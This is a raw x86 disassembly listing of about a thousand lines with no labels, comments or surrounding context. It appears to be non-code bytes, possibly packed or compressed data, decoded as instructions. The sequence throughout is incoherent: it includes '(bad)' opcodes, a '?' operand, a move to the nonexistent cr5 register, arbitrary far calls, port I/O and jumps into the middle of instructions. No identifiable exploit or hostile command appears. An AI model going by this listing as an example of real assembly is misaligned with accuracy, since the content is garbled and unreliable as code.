  4bca82:	rol    BYTE PTR [edx+0x20],cl
  4bca85:	ins    DWORD PTR es:[edi],dx
  4bca86:	sbb    al,0x54
  4bca88:	add    DWORD PTR [esp+edx*4+0x66],ebp
  4bca8c:	inc    esi
  4bca8d:	bound  edi,QWORD PTR fs:0x223121ba
  4bca94:	push   cs
  4bca95:	push   edx
  4bca96:	xor    BYTE PTR [edx+ebx*8+0xa],dl
  4bca9a:	xchg   ebx,eax
  4bca9b:	jp     0x4bcaeb
  4bca9d:	fs sbb BYTE PTR ss:[eax+0x37],ah
  4bcaa2:	icebp  
  4bcaa3:	mov    bl,0x80
  4bcaa5:	outs   dx,BYTE PTR ds:[esi]
  4bcaa6:	or     BYTE PTR [ecx-0xf559faa],0xc9
  4bcaad:	cmp    BYTE PTR [eax-0x75],ah
  4bcab0:	dec    esi
  4bcab1:	retf   0x469e
  4bcab4:	pop    eax
  4bcab5:	ins    BYTE PTR es:[edi],dx
  4bcab6:	popa   
  4bcab7:	or     eax,0xcc24adb0
  4bcabc:	test   BYTE PTR [ecx+edi*8],cl
  4bcabf:	pop    eax
  4bcac0:	test   DWORD PTR [esi-0x7c16766f],esp
  4bcac6:	or     ah,ch
  4bcac8:	pop    edi
  4bcac9:	ret    
  4bcaca:	and    edi,DWORD PTR [edx+0x74ff1094]
  4bcad0:	push   cs
  4bcad1:	mov    dl,BYTE PTR [esi+0xddd296c]
  4bcad7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4bcad8:	mov    ebp,ebx
  4bcada:	mov    al,BYTE PTR [esi-0x1778e470]
  4bcae0:	mov    ds:0x5092a021,eax
  4bcae5:	adc    DWORD PTR [ebx-0x23],0x1701f136
  4bcaec:	pop    edx
  4bcaed:	(bad)  
  4bcaee:	in     al,0x1d
  4bcaf0:	pop    eax
  4bcaf1:	jns    0x4bcb0f
  4bcaf3:	push   esi
  4bcaf4:	jge    0x4bcb54
  4bcaf6:	out    dx,eax
  4bcaf7:	mov    eax,ebx
  4bcaf9:	mov    al,0xc2
  4bcafb:	(bad)  
  4bcafc:	adc    DWORD PTR [ebx+0x3b],esi
  4bcaff:	adc    bl,BYTE PTR [esi+0x34634c74]
  4bcb05:	xchg   esi,eax
  4bcb06:	sbb    esi,DWORD PTR [edi+0x328d743d]
  4bcb0c:	cmp    eax,0x1047a06
  4bcb11:	add    DWORD PTR [edi],esp
  4bcb13:	iret   
  4bcb14:	repz mov esp,0x3c3d1966
  4bcb1a:	push   es
  4bcb1b:	pop    edi
  4bcb1c:	and    BYTE PTR [ebp+0x69e79ec8],0x3e
  4bcb23:	push   cs
  4bcb24:	xor    BYTE PTR ds:[edx+ebp*4-0x13],ch
  4bcb29:	cmp    eax,0xc7cd3ed
  4bcb2e:	aas    
  4bcb2f:	ss int 0x42
  4bcb32:	push   cs
  4bcb33:	sbb    eax,0x9f366946
  4bcb38:	out    0x6,eax
  4bcb3a:	arpl   WORD PTR [edx+0x40413e8b],ax
  4bcb40:	popa   
  4bcb41:	call   0x1ed8:0xcbe7bdef
  4bcb48:	mov    ebx,0x106de2e
  4bcb4d:	inc    eax
  4bcb4e:	and    DWORD PTR [ecx-0x61],ebp
  4bcb51:	out    0x7b,al
  4bcb53:	xchg   esi,eax
  4bcb54:	push   ss
  4bcb55:	jmp    0x4bcb94
  4bcb57:	jb     0x4bcb2e
  4bcb59:	inc    ecx
  4bcb5a:	push   es
  4bcb5b:	fisubr DWORD PTR [eax-0x141863d3]
  4bcb61:	cld    
  4bcb62:	(bad)  
  4bcb63:	xchg   esi,eax
  4bcb64:	inc    ebx
  4bcb65:	or     ebp,DWORD PTR [edx+0x35]
  4bcb68:	inc    eax
  4bcb69:	adc    BYTE PTR [eax],0x42
  4bcb6c:	cmp    BYTE PTR [edx],bl
  4bcb6e:	ins    BYTE PTR es:[edi],dx
  4bcb6f:	xor    BYTE PTR [eax+0x4ad4328a],0x37
  4bcb76:	mov    cl,0x8d
  4bcb78:	xchg   DWORD PTR [ecx-0x40db5358],eax
  4bcb7e:	(bad)  
  4bcb7f:	stos   DWORD PTR es:[edi],eax
  4bcb80:	push   0x21
  4bcb82:	in     eax,0xeb
  4bcb84:	jge    0x4bcb89
  4bcb86:	test   DWORD PTR [esi-0x45],0xa86a539e
  4bcb8d:	mov    ds:0x9953568f,al
  4bcb92:	shl    BYTE PTR [edi],cl
  4bcb94:	fst    QWORD PTR [ecx-0x35]
  4bcb97:	lock js 0x4bcbbb
  4bcb9a:	dec    eax
  4bcb9b:	pop    ds
  4bcb9c:	sub    ch,BYTE PTR [ecx]
  4bcb9e:	test   BYTE PTR [ecx+ebp*1],0x45
  4bcba2:	add    ebp,DWORD PTR [ebx+0x40]
  4bcba5:	or     BYTE PTR [eax],ah
  4bcba7:	xchg   BYTE PTR [ecx-0x22154066],dh
  4bcbad:	lea    ebx,[ecx+0x34]
  4bcbb0:	lds    ebp,FWORD PTR [edx]
  4bcbb2:	cs dec ecx
  4bcbb4:	jae    0x4bcbcc
  4bcbb6:	push   es
  4bcbb7:	xor    eax,0xcf87d41
  4bcbbc:	pop    es
  4bcbbd:	adc    DWORD PTR [edx],eax
  4bcbbf:	mov    ch,0x5a
  4bcbc1:	cld    
  4bcbc2:	sbb    eax,0xa2eb11ce
  4bcbc7:	or     al,0xb1
  4bcbc9:	add    eax,0x3d21407c
  4bcbce:	pop    es
  4bcbcf:	cmovg  eax,DWORD PTR [ecx-0x5970fe9d]
  4bcbd6:	jne    0x4bcc01
  4bcbd8:	fwait
  4bcbd9:	ror    BYTE PTR [ecx-0x78a27dd5],0x7e
  4bcbe0:	mov    eax,ds:0xb141a173
  4bcbe5:	xchg   DWORD PTR [esi+esi*2-0x38dc4e11],ebp
  4bcbec:	das    
  4bcbed:	add    BYTE PTR [edi],dh
  4bcbef:	add    BYTE PTR gs:[ebx],bh
  4bcbf2:	imul   ebx,DWORD PTR ds:0x535330db,0x5f63f023
  4bcbfc:	shl    BYTE PTR [ebx],0x56
  4bcbff:	lods   al,BYTE PTR ds:[esi]
  4bcc00:	fimul  WORD PTR [ecx]
  4bcc02:	add    bh,ch
  4bcc04:	test   BYTE PTR ds:0xf669105b,ch
  4bcc0a:	xchg   ecx,eax
  4bcc0b:	adc    BYTE PTR [edx],cl
  4bcc0d:	mov    ecx,DWORD PTR [ebx-0x13]
  4bcc10:	jmp    0x4bcbaa
  4bcc12:	push   ds
  4bcc13:	test   eax,0x89791803
  4bcc18:	aaa    
  4bcc19:	jns    0x4bcbf9
  4bcc1b:	xor    al,0xcb
  4bcc1d:	es push ecx
  4bcc1f:	cmp    DWORD PTR [ecx+0x135a5ecd],0xf03b521c
  4bcc29:	jo     0x4bcc42
  4bcc2b:	pop    ebp
  4bcc2c:	sbb    BYTE PTR [ebx],ah
  4bcc2e:	mov    BYTE PTR [ebx],ah
  4bcc30:	loop   0x4bcc40
  4bcc32:	lahf   
  4bcc33:	push   eax
  4bcc34:	sbb    ah,BYTE PTR [edx]
  4bcc36:	adc    BYTE PTR [eax+0x1a0480ae],dl
  4bcc3c:	adc    BYTE PTR [edi+0x18],ch
  4bcc3f:	(bad)  
  4bcc40:	mov    dh,0x36
  4bcc42:	call   0x1a81fc10
  4bcc47:	jo     0x4bcc24
  4bcc49:	add    DWORD PTR [edx*1-0x7cf0a9a3],edi
  4bcc50:	out    dx,al
  4bcc51:	pop    ss
  4bcc52:	mov    ds:0x362523f1,al
  4bcc57:	push   edx
  4bcc58:	push   ebx
  4bcc59:	sbb    DWORD PTR [eax],ebx
  4bcc5b:	mov    bl,0x81
  4bcc5d:	clc    
  4bcc5e:	cmp    eax,0xfb6a338
  4bcc63:	or     al,0xfc
  4bcc65:	inc    esp
  4bcc66:	jae    0x4bcca2
  4bcc68:	jle    0x4bcc9e
  4bcc6a:	clc    
  4bcc6b:	or     al,0x5e
  4bcc6d:	rcl    BYTE PTR [ecx+0x3aac9d03],cl
  4bcc73:	push   ebx
  4bcc74:	into   
  4bcc75:	test   BYTE PTR [esi],dl
  4bcc77:	mov    ds:0x49c8054d,eax
  4bcc7c:	hlt    
  4bcc7d:	mov    BYTE PTR [ecx-0x2e],cl
  4bcc80:	(bad)  [edx]
  4bcc82:	mov    BYTE PTR [ebx+0x66],0x72
  4bcc86:	(bad)  [ecx]
  4bcc88:	or     eax,DWORD PTR [ecx+0x1f0753b]
  4bcc8e:	mov    BYTE PTR [ebp+esi*2-0x6208eff3],0x4a
  4bcc96:	pop    ds
  4bcc97:	jmp    0x4bcca2
  4bcc99:	adc    eax,0x8143c43b
  4bcc9e:	or     eax,0x2e4b2a07
  4bcca3:	mov    al,0x8a
  4bcca5:	inc    ecx
  4bcca6:	sub    al,0x5b
  4bcca8:	jno    0x4bcc30
  4bccaa:	adc    BYTE PTR [ebp+0x4],0xb5
  4bccae:	dec    ebx
  4bccaf:	cdq    
  4bccb0:	xor    eax,0x61f07a0
  4bccb5:	and    BYTE PTR [eax-0x10],al
  4bccb8:	das    
  4bccb9:	cmp    BYTE PTR [edi],ch
  4bccbb:	and    edi,DWORD PTR [edx+0x59]
  4bccbe:	push   0x10
  4bccc0:	xor    eax,0xc4e013d6
  4bccc5:	add    eax,0x13514294
  4bccca:	push   ss
  4bcccb:	mov    ebx,DWORD PTR [ebx]
  4bcccd:	aaa    
  4bccce:	arpl   WORD PTR [edx+0x39],sp
  4bccd1:	fs xchg edx,eax
  4bccd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4bccd4:	data16 outs dx,BYTE PTR ds:[esi]
  4bccd6:	sub    DWORD PTR [edx],esi
  4bccd8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4bccd9:	lock xor BYTE PTR [edx],ah
  4bccdc:	inc    ebx
  4bccdd:	push   ebx
  4bccde:	or     al,0xa1
  4bcce0:	push   esi
  4bcce1:	call   0xccca:0x6d4a8753
  4bcce8:	push   ebp
  4bcce9:	and    eax,0x5a960a04
  4bccee:	sbb    al,0x4a
  4bccf1:	sub    esi,ebx
  4bccf3:	pop    ecx
  4bccf4:	sub    al,cl
  4bccf6:	jne    0x4bcc9d
  4bccf8:	cmc    
  4bccf9:	mov    BYTE PTR [ebp-0x778f4bec],cl
  4bccff:	pop    eax
  4bcd00:	push   0x80b18cbf
  4bcd05:	xchg   esi,eax
  4bcd06:	mov    esp,0xf0481773
  4bcd0b:	xor    cl,dl
  4bcd0d:	pop    esp
  4bcd0e:	jo     0x4bcd7c
  4bcd10:	cmp    edi,0x67
  4bcd13:	js     0x4bcd61
  4bcd15:	fabs   
  4bcd17:	dec    ecx
  4bcd18:	mov    esi,0x68a6424f
  4bcd1d:	and    bh,BYTE PTR [eax+0x70]
  4bcd20:	dec    eax
  4bcd21:	sar    ecx,cl
  4bcd23:	or     al,0xef
  4bcd25:	sti    
  4bcd26:	add    dh,cl
  4bcd28:	cmp    al,BYTE PTR [edi]
  4bcd2a:	das    
  4bcd2b:	mov    dh,0xd5
  4bcd2d:	(bad)  [ebp+0x1]
  4bcd30:	daa    
  4bcd31:	out    dx,al
  4bcd32:	inc    ebx
  4bcd33:	inc    ebx
  4bcd34:	add    DWORD PTR [edi+0x544931a0],ebp
  4bcd3a:	jb     0x4bcd01
  4bcd3c:	enter  0xad04,0x4e
  4bcd40:	(bad)  
  4bcd41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4bcd42:	xchg   DWORD PTR [esi+0xd8f881e],esp
  4bcd48:	add    DWORD PTR [ecx],0x6a
  4bcd4b:	imul   eax,DWORD PTR [ebx],0x1d
  4bcd4e:	jmp    0x4bcd5f
  4bcd50:	mov    dh,0xde
  4bcd52:	and    dh,dl
  4bcd54:	cmp    DWORD PTR [esi+ecx*2-0x450f843f],esi
  4bcd5b:	sub    DWORD PTR [ecx+0x35743167],ecx
  4bcd61:	jle    0x4bcdbd
  4bcd63:	sbb    BYTE PTR [edx],cl
  4bcd65:	sub    DWORD PTR [ebx+0x1f],edx
  4bcd68:	lock and al,bl
  4bcd6b:	inc    ecx
  4bcd6c:	and    dh,BYTE PTR [ecx-0x36e249f1]
  4bcd72:	xchg   ebx,eax
  4bcd73:	jne    0x4bcdb0
  4bcd75:	retf   
  4bcd76:	cmc    
  4bcd77:	add    edx,esi
  4bcd79:	sub    BYTE PTR [edx+0x14],ch
  4bcd7c:	or     ecx,DWORD PTR [edx-0x37]
  4bcd7f:	daa    
  4bcd80:	dec    ecx
  4bcd81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4bcd82:	psrlw  mm6,QWORD PTR [esi]
  4bcd85:	test   al,0xa
  4bcd87:	cmovs  ebp,DWORD PTR [eax+edi*8-0x5abfc908]
  4bcd8f:	lds    ebp,FWORD PTR [ebx+0x7b]
  4bcd92:	push   ebx
  4bcd93:	xor    BYTE PTR [esi],bh
  4bcd95:	pop    ds
  4bcd96:	or     BYTE PTR [edx+0xc],0x2f
  4bcd9a:	mov    cl,0x2c
  4bcd9c:	mov    ebx,DWORD PTR [ebp-0x44]
  4bcd9f:	sbb    BYTE PTR [eax+0x38212443],dl
  4bcda5:	sbb    DWORD PTR [eax+0x3],edx
  4bcda8:	adc    DWORD PTR [eax],edx
  4bcdaa:	loop   0x4bcd2e
  4bcdac:	add    DWORD PTR [esi-0x5e],0x688a07d
  4bcdb3:	punpcklbw mm1,DWORD PTR [ebx-0x49]
  4bcdb7:	dec    ebp
  4bcdb8:	pop    ebp
  4bcdb9:	pop    ss
  4bcdba:	sub    eax,0x2f32ce30
  4bcdbf:	pop    ebx
  4bcdc0:	in     eax,dx
  4bcdc1:	and    DWORD PTR [esi+ecx*1+0x1],0x75
  4bcdc6:	pop    eax
  4bcdc7:	push   ds
  4bcdc8:	or     BYTE PTR [edx-0x2edb157d],ah
  4bcdce:	sar    BYTE PTR [ebx+0x381d1096],1
  4bcdd4:	sub    dh,BYTE PTR [esi+0x10]
  4bcdd7:	mov    al,ds:0x64c13a8c
  4bcddc:	je     0x4bcde6
  4bcdde:	ret    
  4bcddf:	add    DWORD PTR [edx+eiz*1],edx
  4bcde2:	test   al,0xc3
  4bcde4:	daa    
  4bcde5:	and    al,BYTE PTR [ecx]
  4bcde7:	jle    0x4bce42
  4bcde9:	or     DWORD PTR [edx],ebp
  4bcdeb:	mov    ebp,0x83c02b0e
  4bcdf0:	sub    DWORD PTR ds:[ecx-0x54],edi
  4bcdf4:	mov    WORD PTR [edx-0x7087e972],es
  4bcdfa:	ins    BYTE PTR es:[edi],dx
  4bcdfb:	mov    ebp,0x4ef27524
  4bce00:	adc    eax,0xe12c6004
  4bce05:	cmp    al,0x75
  4bce07:	xor    BYTE PTR [ecx-0x6a],ch
  4bce0a:	fisub  WORD PTR [eax]
  4bce0c:	mov    esp,0x243cd9f3
  4bce11:	sub    BYTE PTR ss:0x5ecb7dfb,bl
  4bce18:	sbb    edx,DWORD PTR [ecx]
  4bce1a:	pop    ds
  4bce1b:	mov    esi,0x38623c28
  4bce20:	mov    bl,0x42
  4bce22:	dec    edi
  4bce23:	mov    ebp,0x4240fdb6
  4bce28:	mov    ds:0xf52b441b,eax
  4bce2d:	mov    ah,0x17
  4bce2f:	pop    es
  4bce30:	ss push ds
  4bce32:	dec    ebx
  4bce33:	pushf  
  4bce34:	sub    eax,ecx
  4bce36:	fld    DWORD PTR [esi-0x38]
  4bce39:	dec    ebp
  4bce3a:	pop    ecx
  4bce3b:	mov    dl,0x72
  4bce3d:	and    cl,BYTE PTR [esi+edi*2]
  4bce40:	popf   
  4bce41:	adc    BYTE PTR [esi],ah
  4bce43:	cmp    al,BYTE PTR [ebx-0x556d7863]
  4bce49:	sub    edx,0x6c
  4bce4c:	fs ins DWORD PTR es:[edi],dx
  4bce4e:	push   ebx
  4bce4f:	add    bl,BYTE PTR [esi]
  4bce51:	push   es
  4bce52:	adc    DWORD PTR [eax],ebx
  4bce54:	outs   dx,BYTE PTR ds:[esi]
  4bce55:	add    ebx,DWORD PTR [ecx+0x18]
  4bce58:	fdivr  QWORD PTR [ebp-0x7d27ac04]
  4bce5e:	jno    0x4bcea5
  4bce60:	jecxz  0x4bce1a
  4bce62:	call   0x1846:0xfff59147
  4bce69:	inc    edx
  4bce6a:	and    al,0xd1
  4bce6c:	stc    
  4bce6d:	add    ecx,edi
  4bce6f:	sub    esi,ecx
  4bce71:	js     0x4bceaa
  4bce73:	hlt    
  4bce74:	imul   eax,DWORD PTR [eax+esi*4+0x4cd32c4e],0x2c9d69fd
  4bce7f:	push   esp
  4bce80:	mov    edx,0x22780c8d
  4bce85:	ficom  WORD PTR [edx+0x149c1e63]
  4bce8b:	jmp    0x4bcee3
  4bce8d:	add    BYTE PTR [edx+edi*2+0x33],al
  4bce91:	je     0x4bced1
  4bce93:	(bad)  
  4bce94:	jmp    0x205a4fc9
  4bce99:	fist   WORD PTR [esi+eiz*2]
  4bce9d:	jmp    0x4bceb5
  4bce9f:	cmp    BYTE PTR [eax-0x7cfa478],0x5
  4bcea6:	mov    ecx,0x3ceb12fd
  4bceab:	das    
  4bceac:	add    esi,DWORD PTR [ebp-0x9]
  4bceaf:	cmp    DWORD PTR [esi],esi
  4bceb1:	sub    BYTE PTR [ebx],bh
  4bceb3:	mov    ecx,DWORD PTR [esi]
  4bceb5:	scas   al,BYTE PTR es:[edi]
  4bceb6:	pusha  
  4bceb7:	or     ebp,DWORD PTR [esi-0x60]
  4bceba:	push   edx
  4bcebb:	adc    al,0x64
  4bcebd:	cwde   
  4bcebe:	in     al,0x33
  4bcec0:	or     eax,0x635842d6
  4bcec5:	cld    
  4bcec6:	sub    BYTE PTR [esi+0x283cd096],bh
  4bcecc:	rcl    BYTE PTR [edi],1
  4bcece:	(bad)  
  4bcecf:	aad    0x83
  4bced1:	cmp    dh,BYTE PTR [ebp+eiz*2+0x1e361527]
  4bced8:	sbb    al,al
  4bceda:	mov    edx,0x5b30c007
  4bcedf:	mov    eax,0x6ae760ff
  4bcee4:	fistp  QWORD PTR [eax]
  4bcee6:	pushf  
  4bcee7:	in     al,0x8a
  4bcee9:	jns    0x4bcee9
  4bceeb:	jmp    0x4bcf47
  4bceed:	inc    BYTE PTR [ecx+edx*1]
  4bcef0:	push   es
  4bcef1:	inc    esp
  4bcef2:	jnp    0x4bcf69
  4bcef4:	sar    DWORD PTR [ebx+0x43ed80a0],1
  4bcefa:	aas    
  4bcefb:	scas   ax,WORD PTR es:[edi]
  4bcefd:	add    eax,0xbf900237
  4bcf02:	mov    dh,0x4e
  4bcf04:	fcomi  st,st(1)
  4bcf06:	dec    ecx
  4bcf07:	xchg   ebp,eax
  4bcf08:	xor    eax,0x8b3438b6
  4bcf0d:	adc    DWORD PTR [ebx],ebp
  4bcf0f:	mov    al,0x30
  4bcf11:	js     0x4bcf0c
  4bcf13:	sub    ebx,DWORD PTR [edx-0x52c3e233]
  4bcf19:	mov    cl,BYTE PTR [edi+ebx*4+0x25b3438e]
  4bcf20:	stc    
  4bcf21:	jp     0x4bcf6b
  4bcf23:	dec    edx
  4bcf24:	je     0x4bcf3e
  4bcf26:	push   bx
  4bcf28:	imul   esp,DWORD PTR [eax-0x10],0x33eb3f6e
  4bcf2f:	jo     0x4bcf44
  4bcf31:	mov    eax,ds:0xebb13151
  4bcf36:	add    al,dl
  4bcf38:	xchg   ebx,eax
  4bcf39:	sbb    bl,BYTE PTR [ebp-0x1]
  4bcf3c:	dec    edx
  4bcf3d:	sub    DWORD PTR [ecx],ebp
  4bcf3f:	pushf  
  4bcf40:	mov    bl,0xa5
  4bcf42:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4bcf43:	mov    al,ds:0x3957011e
  4bcf48:	scas   al,BYTE PTR es:[edi]
  4bcf49:	adc    BYTE PTR [esi+0x31],ch
  4bcf4c:	pop    ecx
  4bcf4d:	pop    eax
  4bcf4e:	push   0x83301d01
  4bcf53:	call   0x40dc8606
  4bcf58:	sbb    DWORD PTR [ebx],esi
  4bcf5a:	pop    esp
  4bcf5b:	ret    0xc2db
  4bcf5e:	cmp    BYTE PTR [edi+0x3f],dh
  4bcf61:	popf   
  4bcf62:	push   ds
  4bcf63:	mov    dh,0xe2
  4bcf65:	scas   al,BYTE PTR es:[edi]
  4bcf66:	push   edi
  4bcf67:	push   ebx
  4bcf68:	(bad)  
  4bcf69:	mov    esi,DWORD PTR [eax+ebp*4+0x40]
  4bcf6d:	pop    ecx
  4bcf6e:	je     0x4bcfda
  4bcf70:	dec    ecx
  4bcf71:	xchg   ebp,eax
  4bcf72:	push   esi
  4bcf73:	ins    BYTE PTR es:[edi],dx
  4bcf74:	aad    0xf1
  4bcf76:	js     0x4bcfb2
  4bcf78:	mov    fs,WORD PTR [edx+0x28789bf9]
  4bcf7e:	xlat   BYTE PTR ds:[ebx]
  4bcf7f:	inc    ecx
  4bcf80:	push   ebx
  4bcf81:	jnp    0x4bcf1a
  4bcf83:	push   eax
  4bcf84:	push   edx
  4bcf85:	add    DWORD PTR [edi],ebp
  4bcf87:	out    dx,al
  4bcf88:	and    ecx,DWORD PTR [ecx]
  4bcf8a:	jo     0x4bcfdd
  4bcf8c:	pushf  
  4bcf8d:	dec    esp
  4bcf8e:	pop    es
  4bcf8f:	push   DWORD PTR [esi+0x62]
  4bcf92:	push   ebx
  4bcf93:	js     0x4bcfcf
  4bcf95:	xor    BYTE PTR [esi+ebx*4+0x2c],cl
  4bcf99:	mov    eax,0xc812461f
  4bcf9e:	test   al,0xeb
  4bcfa0:	or     eax,ebx
  4bcfa2:	xchg   BYTE PTR [edi-0x48],al
  4bcfa5:	jae    0x4bcf76
  4bcfa7:	and    BYTE PTR [ebx-0x72e434a],cl
  4bcfad:	mov    ebp,0xd3e5c874
  4bcfb2:	jns    0x4bd010
  4bcfb4:	push   ebx
  4bcfb5:	inc    ebx
  4bcfb6:	mov    ecx,0x71c770cb
  4bcfbb:	mov    DWORD PTR [ebx+esi*8],esi
  4bcfbe:	xchg   edx,eax
  4bcfbf:	iret   
  4bcfc0:	sbb    esi,DWORD PTR [eax+0x2e]
  4bcfc3:	adc    esp,DWORD PTR [edi+0x42]
  4bcfc6:	jbe    0x4bcf62
  4bcfc8:	xor    al,0x7a
  4bcfca:	xchg   DWORD PTR [eax-0x5cce8fce],ecx
  4bcfd0:	(bad)
  4bcfd4:	pop    es
  4bcfd5:	dec    edi
  4bcfd6:	jne    0x4bcfde
  4bcfd8:	cmp    esp,DWORD PTR [eax+0x75]
  4bcfdb:	ds mov ebx,0x35baa852
  4bcfe1:	ss sti 
  4bcfe3:	push   esi
  4bcfe4:	ret    
  4bcfe5:	add    DWORD PTR [ebx],edi
  4bcfe7:	xor    edx,0xffffffd1
  4bcfea:	les    ecx,FWORD PTR [edi-0x73ff2839]
  4bcff0:	add    ch,dh
  4bcff2:	add    edx,edx
  4bcff4:	fs std 
  4bcff6:	mov    al,0x85
  4bcff8:	sbb    al,BYTE PTR [ebx]
  4bcffa:	sub    DWORD PTR [edi-0xefdc6cc],esp
  4bd000:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4bd001:	hlt    
  4bd002:	cmp    BYTE PTR [edi],cl
  4bd004:	mov    esi,gs
  4bd006:	sub    DWORD PTR [edx-0x47],esp
  4bd009:	and    dl,BYTE PTR [ebx+0x14]
  4bd00c:	popa   
  4bd00d:	sbb    BYTE PTR [eax+ecx*2],al
  4bd010:	push   eax
  4bd011:	cli    
  4bd012:	cmp    al,BYTE PTR [edx]
  4bd014:	and    BYTE PTR [edi+0x57],al
  4bd017:	xor    BYTE PTR [ecx-0x3b8a0d4c],dl
  4bd01d:	cmp    BYTE PTR [edx],bl
  4bd01f:	or     al,0x72
  4bd021:	dec    ebx
  4bd022:	jl     0x4bd054
  4bd024:	mov    WORD PTR [esi],?
  4bd026:	and    bh,BYTE PTR [esi+0x218dc9be]
  4bd02c:	and    edx,edx
  4bd02e:	sub    DWORD PTR ds:[ecx-0x6e],edi
  4bd032:	and    DWORD PTR [edx],0x49
  4bd035:	iret   
  4bd036:	add    eax,0x30842518
  4bd03b:	push   ecx
  4bd03c:	dec    esi
  4bd03d:	add    BYTE PTR [ecx+0x226dc283],dl
  4bd043:	pusha  
  4bd044:	mov    al,0xc2
  4bd046:	js     0x4bcfe0
  4bd048:	outs   dx,DWORD PTR ds:[esi]
  4bd049:	xchg   edx,eax
  4bd04a:	(bad)  
  4bd04b:	add    al,0xee
  4bd04d:	and    dh,BYTE PTR [ebp-0x1b029f77]
  4bd053:	dec    esp
  4bd054:	cmp    DWORD PTR [ebx+0x47],eax
  4bd057:	pop    es
  4bd058:	pop    edx
  4bd05a:	pop    eax
  4bd05b:	sbb    BYTE PTR [esp+edi*4],dl
  4bd05e:	jge    0x4bd066
  4bd060:	js     0x4bcfe2
  4bd062:	in     eax,dx
  4bd063:	(bad)  
  4bd064:	mov    dl,0x68
  4bd066:	out    dx,al
  4bd067:	dec    eax
  4bd068:	imul   bh
  4bd06a:	pop    esp
  4bd06b:	adc    ebx,eax
  4bd06d:	mov    dh,BYTE PTR [ebx]
  4bd06f:	push   ebx
  4bd070:	add    al,0x63
  4bd072:	push   ebp
  4bd073:	leave  
  4bd074:	or     BYTE PTR [eiz*2-0x56e3966f],0x26
  4bd07c:	or     al,0x8b
  4bd07e:	inc    eax
  4bd07f:	push   ds
  4bd080:	push   cs
  4bd081:	and    esp,ebx
  4bd083:	push   ecx
  4bd084:	pop    edx
  4bd085:	and    al,0x58
  4bd087:	rol    BYTE PTR [edx],0x64
  4bd08a:	inc    esp
  4bd08b:	inc    eax
  4bd08c:	xchg   edi,eax
  4bd08d:	adc    DWORD PTR ds:0x104752dd,0xd7581584
  4bd097:	rol    al,cl
  4bd099:	add    BYTE PTR [ecx-0x4c],ch
  4bd09c:	sub    DWORD PTR [esi-0x58],eax
  4bd09f:	add    DWORD PTR [ebp+edx*1-0x7fc8225d],ecx
  4bd0a6:	test   DWORD PTR ds:0xca008d33,eax
  4bd0ac:	xchg   esi,eax
  4bd0ad:	adc    al,0x3
  4bd0af:	pop    eax
  4bd0b0:	or     BYTE PTR [eax+eax*1+0x4d443a06],dl
  4bd0b7:	push   ebx
  4bd0b8:	jae    0x4bd103
  4bd0ba:	neg    esp
  4bd0bc:	addr16 pop es
  4bd0be:	sub    dl,ch
  4bd0c0:	repnz gs dec ebp
  4bd0c3:	mov    edx,0x886018c
  4bd0c8:	mov    ds:0xaf00ff51,eax
  4bd0cd:	retf   
  4bd0ce:	shr    BYTE PTR [ecx-0x7c],0x3
  4bd0d2:	dec    esp
  4bd0d3:	sub    BYTE PTR [esi+0x52fea104],ch
  4bd0d9:	add    DWORD PTR [edi-0x48],ebp
  4bd0dc:	inc    edx
  4bd0dd:	and    al,0xf4
  4bd0df:	mov    ch,0x92
  4bd0e1:	ret    0x7c00
  4bd0e4:	mov    ds:0x94d5d656,eax
  4bd0e9:	test   al,0x8d
  4bd0eb:	add    al,0x9d
  4bd0ed:	lea    eax,[ecx-0x377fc879]
  4bd0f3:	es sahf 
  4bd0f5:	pusha  
  4bd0f6:	add    cl,ah
  4bd0f8:	push   esp
  4bd0f9:	call   0x3a6:0x2496b897
  4bd100:	pop    ebp
  4bd101:	dec    eax
  4bd102:	mov    ah,0xae
  4bd104:	lods   al,BYTE PTR ds:[esi]
  4bd105:	mov    cr5,eax
  4bd108:	dec    esp
  4bd109:	sbb    BYTE PTR [eax],bl
  4bd10b:	inc    esp
  4bd10c:	add    eax,0xa3366505
  4bd111:	mov    al,BYTE PTR [edx+0x2ab70b42]
  4bd117:	ins    BYTE PTR es:[edi],dx
  4bd118:	cmp    edx,ecx
  4bd11a:	sub    al,0xf7
  4bd11c:	dec    ebx
  4bd11d:	xor    al,0x70
  4bd11f:	sbb    DWORD PTR [ecx],edi
  4bd121:	inc    edi
  4bd122:	pop    es
  4bd123:	add    edx,esp
  4bd125:	inc    eax
  4bd126:	dec    esi
  4bd127:	out    dx,al
  4bd128:	cmc    
  4bd129:	sar    DWORD PTR [eax+edx*1],0xcf
  4bd12d:	xchg   edx,eax
  4bd12e:	outs   dx,BYTE PTR ds:[esi]
  4bd12f:	add    eax,0x51f63301
  4bd134:	mov    DWORD PTR [ebp-0x2997b9dc],edx
  4bd13a:	je     0x4bd138
  4bd13c:	push   eax
  4bd13d:	sub    al,0x64
  4bd13f:	loop   0x4bd1ba
  4bd141:	and    esi,DWORD PTR [eax]
  4bd143:	push   es
  4bd144:	xor    al,0x38
  4bd146:	push   0x7f580277
  4bd14b:	push   edi
  4bd14c:	sub    al,0xe7
  4bd14e:	push   eax
  4bd14f:	stos   DWORD PTR es:[edi],eax
  4bd150:	xor    BYTE PTR [ecx+0x7545ca02],bh
  4bd156:	fidiv  DWORD PTR [edi+0x6a]
  4bd159:	sbb    BYTE PTR [ebp+0x689686c2],ch
  4bd15f:	cmp    DWORD PTR [esi],eax
  4bd161:	ins    BYTE PTR es:[edi],dx
  4bd162:	fs pushf 
  4bd164:	mov    ah,BYTE PTR [edx+0x3e266874]
  4bd16a:	and    BYTE PTR [edi-0x63724bf3],al
  4bd170:	cdq    
  4bd171:	cmp    al,ah
  4bd173:	sbb    DWORD PTR [edi-0x5fd1ed58],0x5028fb53
  4bd17d:	arpl   WORD PTR [eax],ax
  4bd17f:	ds inc edx
  4bd181:	cmp    BYTE PTR [ebp+0x48100454],cl
  4bd187:	xchg   ebx,eax
  4bd188:	sbb    al,0xcc
  4bd18a:	stc    
  4bd18b:	dec    esp
  4bd18c:	push   eax
  4bd18d:	add    edx,DWORD PTR [ecx]
  4bd18f:	dec    edi
  4bd190:	sub    esi,ebp
  4bd192:	ret    0x7b58
  4bd195:	bound  edi,QWORD PTR [eax]
  4bd197:	add    DWORD PTR [eax+edi*1-0x569172a4],edi
